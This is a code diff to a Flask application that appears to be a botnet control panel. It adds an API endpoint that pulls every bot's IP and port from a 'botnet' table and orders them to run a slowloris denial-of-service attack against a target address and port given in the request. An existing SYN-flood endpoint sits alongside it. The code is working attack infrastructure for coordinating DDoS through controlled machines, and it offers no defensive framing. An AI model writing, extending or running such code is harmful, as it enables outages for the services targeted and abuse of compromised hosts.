@@ -211,6 +211,19 @@ def attackSyn():
     # print(res)
     print(result)
     return jsonify(data=result), 200
+@app.route('/api/botnet/attack/lor', methods=['POST'])
+def attackLor():
+    lor = send_to_bot.Executor('slowloris')
+    data = sql.session.execute(text('SELECT * FROM botnet'))
+    res = list()
+    # print(request.form)
+    for i in data:
+        jsonres = {'identifier': i.unique_identifier, "ip": i.ip_address, "port": i.port}
+        res.append(jsonres)
+    result = lor.slowloris(res, request.form['t_ip'], request.form['t_port'],request.form['t_socket'])
+    # print(res)
+    print(result)
+    return jsonify(data=result), 200
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0",debug=True)
